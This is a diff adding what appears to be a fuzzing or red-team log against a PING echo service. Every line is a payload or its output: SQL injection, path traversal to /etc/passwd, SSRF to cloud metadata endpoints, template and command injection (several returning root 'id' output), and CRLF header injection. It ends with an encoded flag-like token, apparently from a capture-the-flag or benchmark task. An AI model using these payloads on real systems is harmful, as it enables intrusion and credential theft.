@@ -1,0 +1,65 @@
+PING
+PING
+PING
+PING
+PING
+PING
+PING
+PING 1
+PING 1 AND 1=1
+PING 1 AND 1=2
+PING ../../../../../../etc/passwd
+PING ....//....//....//....//etc/passwd
+PING ..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+PING %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+PING /etc/passwd
+PING ..%252f..%252f..%252fetc%252fpasswd
+PING https://redcell-canary.example.net/
+PING //redcell-canary.example.net
+PING https:/redcell-canary.example.net
+PING https:redcell-canary.example.net
+PING /redcell-canary.example.net
+PING https://trusted.example.com@redcell-canary.example.net/
+PING http://redcell-canary.example.net%2f..
+PING http://169.254.169.254/latest/meta-data/
+PING http://metadata.google.internal/computeMetadata/v1/
+PING http://127.0.0.1/
+PING http://localhost/
+PING http://[::1]/
+PING http://0177.0.0.1/
+PING http://2130706433/
+PING http://169.254.169.254.nip.io/
+PING {{7919*7331}}
+/bin/sh: 1: Bad substitution
+PING *{7919*7331}
+/bin/sh: 1: Bad substitution
+PING {7919*7331}
+PING 1
+uid=0(root) gid=0(root) groups=0(root)
+uid=0(root) gid=0(root) groups=0(root)
+PING 1
+PING 1
+uid=0(root) gid=0(root) groups=0(root)
+PING 1uid=0(root) gid=0(root) groups=0(root)
+PING 1uid=0(root) gid=0(root) groups=0(root)
+PING 1%0aid
+PING
+PING
+PING x
+PING
+PING
+PING
+PING
+PING %0d%0aX-RedCell-Probe-3zb1kt: 1
+PING x
+PING
+PING
+PING
+PING
+PING
+PING
+PING
+PING 127.0.0.1
+PING 1.1.1.1
+RCXb9ta4_0
+RkxBRy1QWUFHRU5ULTQyCg==
